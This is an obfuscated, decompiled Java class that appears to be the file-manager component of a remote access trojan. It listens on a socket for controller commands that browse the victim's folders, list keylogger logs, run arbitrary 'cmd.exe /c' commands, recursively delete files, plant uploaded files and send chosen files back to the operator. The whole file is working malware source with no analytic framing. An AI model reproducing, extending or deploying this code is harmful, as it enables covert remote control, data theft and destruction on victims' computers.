package carLambo;

import java.io.*;
import java.net.Socket;
import java.text.DecimalFormat;

public final class FileManager {
   private Socket socket;
   private OutputStream outputStream;
   private InputStream inputStream;

   // $FF: synthetic method
   private void sdfsldf(String var1) {
      int var2 = this.sabretb();
      byte[] var3 = new byte[8192];
      FileOutputStream var6 = null;
      try {
         var6 = new FileOutputStream(var1);
      } catch (FileNotFoundException e) {
         e.printStackTrace();
      }
      int var5 = 0;
      int var4 = var2;

      for(int var10000 = 0; var10000 != var2; var10000 = var5) {
         FileManager var7;
         if (var4 >= 8192) {
            var4 = 8192;
            var7 = this;
         } else {
            var4 = var4;
            var7 = this;
         }

         try {
            var4 = var7.inputStream.read(var3, 0, var4);
         } catch (IOException e) {
            e.printStackTrace();
         }
         var5 += var4;
         if (var4 == -1) {
            throw new RuntimeException();
         }

         try {
            var6.write(var3, 0, var4);
         } catch (IOException e) {
            e.printStackTrace();
         }
         var4 = var2 - var5;
      }

      try {
         var6.close();
      } catch (IOException e) {
         e.printStackTrace();
      }
   }

   // $FF: synthetic method
   private static String sabretb(String var0) {
      File[] var1 = (new File(var0)).listFiles();
      StringBuilder var2 = new StringBuilder();
      var2.append(var0 + "%%");
      DecimalFormat var7 = new DecimalFormat("#,###.00");
      int var3 = var1.length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         File var5;
         if ((var5 = var1[var4]).isDirectory()) {
            var2.append((new StringBuilder()).insert(0, "D").append(var5.getName()).append("\r\n").append(var5.lastModified()).append("%%").toString());
         } else {
            float var6 = (float)var5.length() / 1024.0F;
            var2.append((new StringBuilder()).insert(0, "F").append(var5.getName()).append("\r\n").append(var7.format((double)var6)).append(" KB").append("\r\n").append(var5.lastModified()).append("%%").toString());
         }

         ++var4;
      }

      return var2.toString().substring(0, var2.toString().length() - 2);
   }

   // $FF: synthetic method
   static void listen(FileManager var0) {
      var0 = var0;

      try {
         while(true) {
            int var2 = var0.sabretb();
            FileManager var1 = var0;
            byte[] var3 = new byte[var2];
            StringBuilder var5 = new StringBuilder();
            int var6 = 0;
            int var4 = var2;

            for(int var10000 = 0; var10000 != var2; var10000 = var6) {
               var4 = var1.inputStream.read(var3, 0, var4);
               var6 += var4;
               if (var4 == -1) {
                  throw new RuntimeException();
               }

               var5.append(new String(var3, 0, var4));
               var4 = var2 - var6;
            }

            String[] var8;
            if ((var8 = var5.toString().split("\\|"))[0].equals("navigate")) {
               var0.dfhttegd(sabretb(var8[1]));
            } else if (var8[0].equals("nav-key-log")) {
               var0.dfhttegd(sabretb(ConnectionUtil.roamingStrlogs));
            } else if (var8[0].equals("open")) {
               Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c \"").append(var8[1]).append("\"").toString());
            } else if (var8[0].equals("delete")) {
               var0.sdfsldf(new File(var8[1]));
            } else if (var8[0].equals("savefile")) {
               var0.sdfsldf(var8[1]);
            } else if (var8[0].equals("bringfile")) {
               File var9;
               if ((var9 = new File(var8[1])).isFile()) {
                  var0.dfhttegd((new StringBuilder()).insert(0, "savefile|").append(var8[2]).toString());
                  var0.sabretb(var9);
               } else {
                  var0.dfhttegd("showdialog|You cannot download a folder");
               }
            }
         }
      } catch (Exception var7) {
         ;
      }
   }

   FileManager(Socket socket) {
      try {
         this.socket = socket;
         this.inputStream = socket.getInputStream();
         this.outputStream = socket.getOutputStream();
         (new Thread(new FileManagerThread(this))).start();
      } catch (Exception var2) {
         ;
      }
   }

   // $FF: synthetic method
   private int sabretb() {
      byte[] var1 = new byte[1];
      StringBuilder var3 = new StringBuilder();

      int var2;
      try {
         while((var2 = this.inputStream.read(var1, 0, 1)) != -1) {
            var3.append(new String(var1, 0, var2));
            if (var3.toString().endsWith("\r\n\r\n")) {
               String var4 = var3.toString();
               return Integer.parseInt(var4.substring(0, var4.indexOf("\r\n\r\n")));
            }
         }

      } catch (Exception e) {
         throw new RuntimeException(e);
      }

      throw new RuntimeException();
   }

   public static String sdfsldf() {
      String var0 = System.getProperty("user.home");
      File[] var1 = (new File(var0)).listFiles();
      StringBuilder var2 = new StringBuilder();
      var2.append(var0 + "%%");
      DecimalFormat var7 = new DecimalFormat("#,###.00");
      int var3 = var1.length;

      int var4;
      for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
         File var5;
         if ((var5 = var1[var4]).isDirectory()) {
            var2.append((new StringBuilder()).insert(0, "D").append(var5.getName()).append("\r\n").append(var5.lastModified()).append("%%").toString());
         } else {
            float var6 = (float)var5.length() / 1024.0F;
            var2.append((new StringBuilder()).insert(0, "F").append(var5.getName()).append("\r\n").append(var7.format((double)var6)).append(" KB").append("\r\n").append(var5.lastModified()).append("%%").toString());
         }

         ++var4;
      }

      return var2.toString().substring(0, var2.toString().length() - 2);
   }

   // $FF: synthetic method
   private void sdfsldf(File var1) {
      if (var1.isDirectory()) {
         File[] var2;
         int var3 = (var2 = var1.listFiles()).length;

         int var4;
         for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
            File var5 = var2[var4];
            ++var4;
            this.sdfsldf(var5);
         }
      }

      var1.delete();
   }

   // $FF: synthetic method
   private void dfhttegd(String var1) {
      String var2 = String.valueOf(var1.getBytes().length + "\r\n\r\n");
      try {
         this.outputStream.write(var2.getBytes());
         this.outputStream.write(var1.getBytes());
         this.outputStream.flush();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   // $FF: synthetic method
   private void sabretb(File var1) {
      try {
         String var2 = String.valueOf(var1.length() + "\r\n\r\n");
         this.outputStream.write(var2.getBytes());
         FileInputStream var6 = new FileInputStream(var1);
         byte[] var7 = new byte[8192];

         int var3;
         while((var3 = var6.read(var7, 0, 8192)) != -1) {
            this.outputStream.write(var7, 0, var3);
            this.outputStream.flush();
         }

         var6.close();
      } catch (Exception var5) {
         try {
            this.socket.close();
         } catch (Exception var4) {
            ;
         }
      }
   }

   // $FF: synthetic method
   private String sdfsldf(int var1) {
      byte[] var2 = new byte[var1];
      StringBuilder var4 = new StringBuilder();
      int var5 = 0;
      int var3 = var1;

      for(int var10000 = 0; var10000 != var1; var10000 = var5) {
         try {
            var3 = this.inputStream.read(var2, 0, var3);

         } catch (Exception e) {
            throw new RuntimeException(e);
         }
         var5 += var3;
         if (var3 == -1) {
            throw new RuntimeException();
         }

         var4.append(new String(var2, 0, var3));
         var3 = var1 - var5;
      }

      return var4.toString();
   }

   // $FF: synthetic method
   private void dfhttegd() {
      try {
         while(true) {
            String[] var1;
            if ((var1 = this.sdfsldf(this.sabretb()).split("\\|"))[0].equals("navigate")) {
               this.dfhttegd(sabretb(var1[1]));
            } else if (var1[0].equals("nav-key-log")) {
               this.dfhttegd(sabretb(ConnectionUtil.roamingStrlogs));
            } else if (var1[0].equals("open")) {
               Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c \"").append(var1[1]).append("\"").toString());
            } else if (var1[0].equals("delete")) {
               this.sdfsldf(new File(var1[1]));
            } else if (var1[0].equals("savefile")) {
               this.sdfsldf(var1[1]);
            } else if (var1[0].equals("bringfile")) {
               File var2;
               if ((var2 = new File(var1[1])).isFile()) {
                  this.dfhttegd((new StringBuilder()).insert(0, "savefile|").append(var1[2]).toString());
                  this.sabretb(var2);
               } else {
                  this.dfhttegd("showdialog|You cannot download a folder");
               }
            }
         }
      } catch (Exception var3) {
         ;
      }
   }
}
